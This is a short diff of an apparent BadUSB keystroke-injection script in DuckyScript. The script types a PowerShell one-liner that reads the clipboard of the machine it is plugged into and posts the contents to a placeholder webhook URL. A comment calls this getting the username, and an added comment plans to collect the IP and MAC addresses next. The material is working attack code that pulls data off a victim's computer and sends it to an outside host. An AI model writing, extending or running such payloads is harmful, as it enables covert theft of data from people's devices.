@@ -8,8 +8,10 @@ DELAY 250
 ENTER
 DELAY 500
 
-REM Getting the username of the device
+REM Getting the username of the device into the webhook
 STRING $content = Get-Clipboard; Invoke-RestMethod -Uri "https://webhook" -Method Post -Body (@{content=$content} | ConvertTo-Json) -ContentType "application/json"
 DELAY 1500
 ENTER
 DELAY 250
+
+REM Getting the ip address and mac 
